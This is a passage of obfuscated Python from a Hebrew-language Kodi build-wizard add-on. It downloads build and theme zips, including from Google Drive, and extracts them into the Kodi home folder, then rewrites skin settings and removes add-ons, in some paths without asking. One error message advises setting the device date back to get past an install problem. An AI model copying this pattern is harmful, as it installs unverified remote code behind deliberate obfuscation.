		OO0OOO0OOO0OO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3874
		try :#line:3875
			O0000OO00OOO000OO =open (OO0OOO0OOO0OO0OOO ,'r')#line:3876
			O0O00000O0O0O0O0O =O0000OO00OOO000OO .read ()#line:3877
			O0000OO00OOO000OO .close ()#line:3878
			O00000O0OOOO0O0O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3879
			O00O00OOO000OOO00 =re .compile (O00000O0OOOO0O0O0 ).findall (O0O00000O0O0O0O0O )[0 ]#line:3880
			O0000OO00OOO000OO =open (OO0OOO0OOO0OO0OOO ,'w')#line:3881
			O0000OO00OOO000OO .write (O0O00000O0O0O0O0O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O00O00OOO000OOO00 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3882
			O0000OO00OOO000OO .close ()#line:3883
		except :#line:3884
				pass #line:3885
		swapSkins ('skin.Premium.mod')#line:3886
def buildWizard (OOOOOO0OOOOO00OOO ,OOOO000O0O00OO0O0 ,theme =None ,over =False ):#line:3889
	if over ==False :#line:3890
		O00OO00OOO00O0O0O =wiz .checkBuild (OOOOOO0OOOOO00OOO ,'url')#line:3891
		if O00OO00OOO00O0O0O ==False :#line:3893
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3898
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3899
			return #line:3900
		O00OO00OOO0O00000 =wiz .workingURL (O00OO00OOO00O0O0O )#line:3901
		if O00OO00OOO0O00000 ==False :#line:3902
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00OO00OOO0O00000 ))#line:3903
			return #line:3904
	if OOOO000O0O00OO0O0 =='gui':#line:3905
		if OOOOOO0OOOOO00OOO ==BUILDNAME :#line:3906
			if over ==True :O0O0OOOO0O0O0O00O =1 #line:3907
			else :O0O0OOOO0O0O0O00O =1 #line:3908
		else :#line:3909
			O0O0OOOO0O0O0O00O =1 #line:3910
		if O0O0OOOO0O0O0O00O :#line:3911
			remove_addons ()#line:3912
			remove_addons2 ()#line:3913
			O0OOOO0O000O000OO =wiz .checkBuild (OOOOOO0OOOOO00OOO ,'gui')#line:3914
			OOO0O00OOO0OO0000 =OOOOOO0OOOOO00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3915
			if not wiz .workingURL (O0OOOO0O000O000OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3916
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3917
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0OOOOO00OOO ),'','אנא המתן')#line:3918
			O00OOOO0OO0OO0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O00OOO0OO0000 )#line:3919
			try :os .remove (O00OOOO0OO0OO0OOO )#line:3920
			except :pass #line:3921
			logging .warning (O0OOOO0O000O000OO )#line:3922
			if 'google'in O0OOOO0O000O000OO :#line:3923
			   O000OO00O00O00OOO =googledrive_download (O0OOOO0O000O000OO ,O00OOOO0OO0OO0OOO ,DP ,wiz .checkBuild (OOOOOO0OOOOO00OOO ,'filesize'))#line:3924
			else :#line:3927
			  downloader .download (O0OOOO0O000O000OO ,O00OOOO0OO0OO0OOO ,DP )#line:3928
			xbmc .sleep (100 )#line:3929
			O00O0000OO000OOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0OOOOO00OOO )#line:3930
			DP .update (0 ,O00O0000OO000OOOO ,'','אנא המתן')#line:3931
			extract .all (O00OOOO0OO0OO0OOO ,HOME ,DP ,title =O00O0000OO000OOOO )#line:3932
			DP .close ()#line:3933
			wiz .defaultSkin ()#line:3934
			wiz .lookandFeelData ('save')#line:3935
			wiz .kodi17Fix ()#line:3936
			if KODIV >=18 :#line:3937
				skindialogsettind18 ()#line:3938
			xbmc .executebuiltin ("ReloadSkin()")#line:3939
			if INSTALLMETHOD ==1 :OOOO0OO0O00O0000O =1 #line:3940
			elif INSTALLMETHOD ==2 :OOOO0OO0O00O0000O =0 #line:3941
			else :DP .close ()#line:3942
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3943
			update_Votes ()#line:3944
			indicatorfastupdate ()#line:3945
		else :#line:3947
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3948
	if OOOO000O0O00OO0O0 =='gui2':#line:3949
		if OOOOOO0OOOOO00OOO ==BUILDNAME :#line:3950
			if over ==True :O0O0OOOO0O0O0O00O =1 #line:3951
			else :O0O0OOOO0O0O0O00O =1 #line:3952
		else :#line:3953
			O0O0OOOO0O0O0O00O =1 #line:3954
		if O0O0OOOO0O0O0O00O :#line:3955
			remove_addons ()#line:3956
			remove_addons2 ()#line:3957
			O0OOOO0O000O000OO =wiz .checkBuild (OOOOOO0OOOOO00OOO ,'gui')#line:3958
			OOO0O00OOO0OO0000 =OOOOOO0OOOOO00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3959
			if not wiz .workingURL (O0OOOO0O000O000OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3960
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3961
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0OOOOO00OOO ),'','אנא המתן')#line:3962
			O00OOOO0OO0OO0OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O00OOO0OO0000 )#line:3963
			try :os .remove (O00OOOO0OO0OO0OOO )#line:3964
			except :pass #line:3965
			logging .warning (O0OOOO0O000O000OO )#line:3966
			if 'google'in O0OOOO0O000O000OO :#line:3967
			   O000OO00O00O00OOO =googledrive_download (O0OOOO0O000O000OO ,O00OOOO0OO0OO0OOO ,DP ,wiz .checkBuild (OOOOOO0OOOOO00OOO ,'filesize'))#line:3968
			else :#line:3971
			  downloader .download (O0OOOO0O000O000OO ,O00OOOO0OO0OO0OOO ,DP )#line:3972
			xbmc .sleep (100 )#line:3973
			O00O0000OO000OOOO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0OOOOO00OOO )#line:3974
			DP .update (0 ,O00O0000OO000OOOO ,'','אנא המתן')#line:3975
			extract .all (O00OOOO0OO0OO0OOO ,HOME ,DP ,title =O00O0000OO000OOOO )#line:3976
			DP .close ()#line:3977
			wiz .defaultSkin ()#line:3978
			wiz .lookandFeelData ('save')#line:3979
			if INSTALLMETHOD ==1 :OOOO0OO0O00O0000O =1 #line:3982
			elif INSTALLMETHOD ==2 :OOOO0OO0O00O0000O =0 #line:3983
			else :DP .close ()#line:3984
		else :#line:3986
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3987
	elif OOOO000O0O00OO0O0 =='fresh':#line:3988
		freshStart (OOOOOO0OOOOO00OOO )#line:3989
	elif OOOO000O0O00OO0O0 =='normal':#line:3990
		if url =='normal':#line:3991
			if KEEPTRAKT =='true':#line:3992
				traktit .autoUpdate ('all')#line:3993
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3994
			if KEEPREAL =='true':#line:3995
				debridit .autoUpdate ('all')#line:3996
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3997
			if KEEPLOGIN =='true':#line:3998
				loginit .autoUpdate ('all')#line:3999
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4000
		O0OO00OOOO000OOOO =int (KODIV );O0OO00OOO000000O0 =int (float (wiz .checkBuild (OOOOOO0OOOOO00OOO ,'kodi')))#line:4001
		if not O0OO00OOOO000OOOO ==O0OO00OOO000000O0 :#line:4002
			if O0OO00OOOO000OOOO ==16 and O0OO00OOO000000O0 <=15 :OO0OOOO0O0O0OO0O0 =False #line:4003
			else :OO0OOOO0O0O0OO0O0 =True #line:4004
		else :OO0OOOO0O0O0OO0O0 =False #line:4005
		if OO0OOOO0O0O0OO0O0 ==True :#line:4006
			O0000OOOOO000OO00 =1 #line:4007
		else :#line:4008
			if not over ==False :O0000OOOOO000OO00 =1 #line:4009
			else :O0000OOOOO000OO00 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4010
		if O0000OOOOO000OO00 :#line:4011
			wiz .clearS ('build')#line:4012
			O0OOOO0O000O000OO =wiz .checkBuild (OOOOOO0OOOOO00OOO ,'url')#line:4013
			OOO0O00OOO0OO0000 =OOOOOO0OOOOO00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4014
			if not wiz .workingURL (O0OOOO0O000O000OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4015
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4016
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0OOOOO00OOO ,wiz .checkBuild (OOOOOO0OOOOO00OOO ,'version')),'','אנא המתן')#line:4017
			O00OOOO0OO0OO0OOO =os .path .join (PACKAGES ,'%s.zip'%OOO0O00OOO0OO0000 )#line:4018
			try :os .remove (O00OOOO0OO0OO0OOO )#line:4019
			except :pass #line:4020
			logging .warning (O0OOOO0O000O000OO )#line:4021
			if 'google'in O0OOOO0O000O000OO :#line:4022
			   O000OO00O00O00OOO =googledrive_download (O0OOOO0O000O000OO ,O00OOOO0OO0OO0OOO ,DP ,wiz .checkBuild (OOOOOO0OOOOO00OOO ,'filesize'))#line:4023
			else :#line:4026
			  downloader .download (O0OOOO0O000O000OO ,O00OOOO0OO0OO0OOO ,DP )#line:4027
			xbmc .sleep (1000 )#line:4028
			O00O0000OO000OOOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0OOOOO00OOO ,wiz .checkBuild (OOOOOO0OOOOO00OOO ,'version'))#line:4029
			DP .update (0 ,O00O0000OO000OOOO ,'','Please Wait')#line:4030
			OO00O0OO0O0OOO000 ,O000O0OOO0O0O000O ,O0O00OOOO00OO0OO0 =extract .all (O00OOOO0OO0OO0OOO ,HOME ,DP ,title =O00O0000OO000OOOO )#line:4031
			if int (float (OO00O0OO0O0OOO000 ))>0 :#line:4032
				try :#line:4033
					wiz .fixmetas ()#line:4034
				except :pass #line:4035
				wiz .lookandFeelData ('save')#line:4036
				wiz .defaultSkin ()#line:4037
				wiz .setS ('buildname',OOOOOO0OOOOO00OOO )#line:4039
				wiz .setS ('buildversion',wiz .checkBuild (OOOOOO0OOOOO00OOO ,'version'))#line:4040
				wiz .setS ('buildtheme','')#line:4041
				wiz .setS ('latestversion',wiz .checkBuild (OOOOOO0OOOOO00OOO ,'version'))#line:4042
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4043
				wiz .setS ('installed','true')#line:4044
				wiz .setS ('extract',str (OO00O0OO0O0OOO000 ))#line:4045
				wiz .setS ('errors',str (O000O0OOO0O0O000O ))#line:4046
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00O0OO0O0OOO000 ,O000O0OOO0O0O000O ))#line:4047
				fastupdatefirstbuild (NOTEID )#line:4048
				wiz .kodi17Fix ()#line:4049
				skin_homeselect ()#line:4050
				skin_lower ()#line:4051
				rdbuildinstall ()#line:4052
				try :gaiaserenaddon ()#line:4053
				except :pass #line:4054
				adults18 ()#line:4055
				skinfix18 ()#line:4056
				try :os .remove (O00OOOO0OO0OO0OOO )#line:4058
				except :pass #line:4059
				O0OOO00O00OO0OO0O =(ADDON .getSetting ("auto_rd"))#line:4060
				if O0OOO00O00OO0OO0O =='true':#line:4061
					try :#line:4062
						setautorealdebrid ()#line:4063
					except :pass #line:4064
				try :#line:4065
					autotrakt ()#line:4066
				except :pass #line:4067
				O00OOO00O000000O0 =(ADDON .getSetting ("imdb_on"))#line:4068
				if O00OOO00O000000O0 =='true':#line:4069
					imdb_synck ()#line:4070
				iptvset ()#line:4071
				if int (float (O000O0OOO0O0O000O ))>0 :#line:4073
					O0O0OOOO0O0O0O00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0OOOOO00OOO ,wiz .checkBuild (OOOOOO0OOOOO00OOO ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO00O0OO0O0OOO000 ,'%',COLOR1 ,O000O0OOO0O0O000O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4074
					if O0O0OOOO0O0O0O00O :#line:4075
						if isinstance (O000O0OOO0O0O000O ,unicode ):#line:4076
							O0O00OOOO00OO0OO0 =O0O00OOOO00OO0OO0 .encode ('utf-8')#line:4077
						wiz .TextBox (ADDONTITLE ,O0O00OOOO00OO0OO0 )#line:4078
				DP .close ()#line:4079
				O00000000O0OOOO0O =wiz .themeCount (OOOOOO0OOOOO00OOO )#line:4080
				builde_Votes ()#line:4081
				indicator ()#line:4082
				if not O00000000O0OOOO0O ==False :#line:4083
					buildWizard (OOOOOO0OOOOO00OOO ,'theme')#line:4084
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4085
				if INSTALLMETHOD ==1 :OOOO0OO0O00O0000O =1 #line:4086
				elif INSTALLMETHOD ==2 :OOOO0OO0O00O0000O =0 #line:4087
				else :resetkodi ()#line:4088
				if OOOO0OO0O00O0000O ==1 :wiz .reloadFix ()#line:4090
				else :wiz .killxbmc (True )#line:4091
			else :#line:4092
				if isinstance (O000O0OOO0O0O000O ,unicode ):#line:4093
					O0O00OOOO00OO0OO0 =O0O00OOOO00OO0OO0 .encode ('utf-8')#line:4094
				O0OOOOOOOOO0OOO00 =open (O00OOOO0OO0OO0OOO ,'r')#line:4095
				OOOOO0OOOOOO0OO00 =O0OOOOOOOOO0OOO00 .read ()#line:4096
				OO000O0OO000O00O0 =''#line:4097
				for OO0OOO0O0000O0O0O in O000OO00O00O00OOO :#line:4098
				  OO000O0OO000O00O0 ='key: '+OO000O0OO000O00O0 +'\n'+OO0OOO0O0000O0O0O #line:4099
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O00OOOO00OO0OO0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO000O0OO000O00O0 )#line:4100
		else :#line:4101
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4102
	elif OOOO000O0O00OO0O0 =='theme':#line:4103
		if theme ==None :#line:4104
			O00000000O0OOOO0O =wiz .checkBuild (OOOOOO0OOOOO00OOO ,'theme')#line:4105
			O0OOO00O0OO000OO0 =[]#line:4106
			if not O00000000O0OOOO0O =='http://'and wiz .workingURL (O00000000O0OOOO0O )==True :#line:4107
				O0OOO00O0OO000OO0 =wiz .themeCount (OOOOOO0OOOOO00OOO ,False )#line:4108
				if len (O0OOO00O0OO000OO0 )>0 :#line:4109
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOOOOO0OOOOO00OOO ,COLOR1 ,len (O0OOO00O0OO000OO0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4110
						wiz .log ("Theme List: %s "%str (O0OOO00O0OO000OO0 ))#line:4111
						O0O0OOOOOOO000OO0 =DIALOG .select (ADDONTITLE ,O0OOO00O0OO000OO0 )#line:4112
						wiz .log ("Theme install selected: %s"%O0O0OOOOOOO000OO0 )#line:4113
						if not O0O0OOOOOOO000OO0 ==-1 :theme =O0OOO00O0OO000OO0 [O0O0OOOOOOO000OO0 ];O0OOO0O0O00000000 =True #line:4114
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4115
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4116
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4117
		else :O0OOO0O0O00000000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOOOOO0OOOOO00OOO ,wiz .checkBuild (OOOOOO0OOOOO00OOO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4118
		if O0OOO0O0O00000000 :#line:4119
			OO0OO00OO00000OOO =wiz .checkTheme (OOOOOO0OOOOO00OOO ,theme ,'url')#line:4120
			OOO0O00OOO0OO0000 =OOOOOO0OOOOO00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4121
			if not wiz .workingURL (OO0OO00OO00000OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4122
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4123
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4124
			O00OOOO0OO0OO0OOO =os .path .join (PACKAGES ,'%s.zip'%OOO0O00OOO0OO0000 )#line:4125
			try :os .remove (O00OOOO0OO0OO0OOO )#line:4126
			except :pass #line:4127
			downloader .download (OO0OO00OO00000OOO ,O00OOOO0OO0OO0OOO ,DP )#line:4128
			xbmc .sleep (1000 )#line:4129
			DP .update (0 ,"","Installing %s "%OOOOOO0OOOOO00OOO )#line:4130
			O00OO0OO0O0OO0OO0 =False #line:4131
			if url not in ["fresh","normal"]:#line:4132
				O00OO0OO0O0OO0OO0 =testTheme (O00OOOO0OO0OO0OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4133
				O0O0OO00000O00O00 =testGui (O00OOOO0OO0OO0OOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4134
				if O00OO0OO0O0OO0OO0 ==True :#line:4135
					wiz .lookandFeelData ('save')#line:4136
					OO00OO0OO0O0O00OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4137
					O000OOOO00000OOO0 =xbmc .getSkinDir ()#line:4138
					skinSwitch .swapSkins (OO00OO0OO0O0O00OO )#line:4140
					O0000O0OOO0O000O0 =0 #line:4141
					xbmc .sleep (1000 )#line:4142
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0000O0OOO0O000O0 <150 :#line:4143
						O0000O0OOO0O000O0 +=1 #line:4144
						xbmc .sleep (1000 )#line:4145
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4146
						wiz .ebi ('SendClick(11)')#line:4147
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4148
					xbmc .sleep (1000 )#line:4149
			O00O0000OO000OOOO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4150
			DP .update (0 ,O00O0000OO000OOOO ,'','אנא המתן')#line:4151
			OO00O0OO0O0OOO000 ,O000O0OOO0O0O000O ,O0O00OOOO00OO0OO0 =extract .all (O00OOOO0OO0OO0OOO ,HOME ,DP ,title =O00O0000OO000OOOO )#line:4152
			wiz .setS ('buildtheme',theme )#line:4153
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO00O0OO0O0OOO000 ,O000O0OOO0O0O000O ))#line:4154
			DP .close ()#line:4155
			if url not in ["fresh","normal"]:#line:4156
				wiz .forceUpdate ()#line:4157
				if KODIV >=17 :wiz .kodi17Fix ()#line:4158
				if O0O0OO00000O00O00 ==True :#line:4159
					wiz .lookandFeelData ('save')#line:4160
					wiz .defaultSkin ()#line:4161
					O000OOOO00000OOO0 =wiz .getS ('defaultskin')#line:4162
					skinSwitch .swapSkins (O000OOOO00000OOO0 )#line:4163
					O0000O0OOO0O000O0 =0 #line:4164
					xbmc .sleep (1000 )#line:4165
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0000O0OOO0O000O0 <150 :#line:4166
						O0000O0OOO0O000O0 +=1 #line:4167
						xbmc .sleep (1000 )#line:4168
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4170
						wiz .ebi ('SendClick(11)')#line:4171
					wiz .lookandFeelData ('restore')#line:4172
				elif O00OO0OO0O0OO0OO0 ==True :#line:4173
					skinSwitch .swapSkins (O000OOOO00000OOO0 )#line:4174
					O0000O0OOO0O000O0 =0 #line:4175
					xbmc .sleep (1000 )#line:4176
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0000O0OOO0O000O0 <150 :#line:4177
						O0000O0OOO0O000O0 +=1 #line:4178
						xbmc .sleep (1000 )#line:4179
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4181
						wiz .ebi ('SendClick(11)')#line:4182
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4183
					wiz .lookandFeelData ('restore')#line:4184
				else :#line:4185
					wiz .ebi ("ReloadSkin()")#line:4186
					xbmc .sleep (1000 )#line:4187
					wiz .ebi ("Container.Refresh")#line:4188
		else :#line:4189
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4190
def skin_homeselect ():#line:4194
	try :#line:4196
		O0OO000000OO00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4197
		O00OOOO0OOO00OOO0 =open (O0OO000000OO00000 ,'r')#line:4199
		OO00O0O0O00O0000O =O00OOOO0OOO00OOO0 .read ()#line:4200
		O00OOOO0OOO00OOO0 .close ()#line:4201
		OOO0OO00O000O00OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4202
		O00000OOO00OO0000 =re .compile (OOO0OO00O000O00OO ).findall (OO00O0O0O00O0000O )[0 ]#line:4203
		O00OOOO0OOO00OOO0 =open (O0OO000000OO00000 ,'w')#line:4204
		O00OOOO0OOO00OOO0 .write (OO00O0O0O00O0000O .replace ('<setting id="HomeS" type="string%s/setting>'%O00000OOO00OO0000 ,'<setting id="HomeS" type="string"></setting>'))#line:4205
		O00OOOO0OOO00OOO0 .close ()#line:4206
	except :#line:4207
		pass #line:4208
def skin_lower ():#line:4211
	O0O00O0OO0O000000 =(ADDON .getSetting ("lower"))#line:4212
	if O0O00O0OO0O000000 =='true':#line:4213
		try :#line:4216
			O0O0OO00OO000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4217
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'r')#line:4219
			O00OO00000OOOO0O0 =OO00OO00O00000O0O .read ()#line:4220
			OO00OO00O00000O0O .close ()#line:4221
			OOO0000OO00O000O0 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4222
			OO0O000O0OO0OOO0O =re .compile (OOO0000OO00O000O0 ).findall (O00OO00000OOOO0O0 )[0 ]#line:4223
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'w')#line:4224
			OO00OO00O00000O0O .write (O00OO00000OOOO0O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%OO0O000O0OO0OOO0O ,'<setting id="none_widget" type="bool">true</setting>'))#line:4225
			OO00OO00O00000O0O .close ()#line:4226
			O0O0OO00OO000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4228
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'r')#line:4230
			O00OO00000OOOO0O0 =OO00OO00O00000O0O .read ()#line:4231
			OO00OO00O00000O0O .close ()#line:4232
			OOO0000OO00O000O0 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4233
			OO0O000O0OO0OOO0O =re .compile (OOO0000OO00O000O0 ).findall (O00OO00000OOOO0O0 )[0 ]#line:4234
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'w')#line:4235
			OO00OO00O00000O0O .write (O00OO00000OOOO0O0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OO0O000O0OO0OOO0O ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4236
			OO00OO00O00000O0O .close ()#line:4237
			O0O0OO00OO000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4239
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'r')#line:4241
			O00OO00000OOOO0O0 =OO00OO00O00000O0O .read ()#line:4242
			OO00OO00O00000O0O .close ()#line:4243
			OOO0000OO00O000O0 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4244
			OO0O000O0OO0OOO0O =re .compile (OOO0000OO00O000O0 ).findall (O00OO00000OOOO0O0 )[0 ]#line:4245
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'w')#line:4246
			OO00OO00O00000O0O .write (O00OO00000OOOO0O0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OO0O000O0OO0OOO0O ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4247
			OO00OO00O00000O0O .close ()#line:4248
			O0O0OO00OO000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4252
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'r')#line:4254
			O00OO00000OOOO0O0 =OO00OO00O00000O0O .read ()#line:4255
			OO00OO00O00000O0O .close ()#line:4256
			OOO0000OO00O000O0 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4257
			OO0O000O0OO0OOO0O =re .compile (OOO0000OO00O000O0 ).findall (O00OO00000OOOO0O0 )[0 ]#line:4258
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'w')#line:4259
			OO00OO00O00000O0O .write (O00OO00000OOOO0O0 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OO0O000O0OO0OOO0O ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4260
			OO00OO00O00000O0O .close ()#line:4261
			O0O0OO00OO000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4265
			OO00OO00O00000O0O =open (O0O0OO00OO000OO0O ,'r')#line:4267
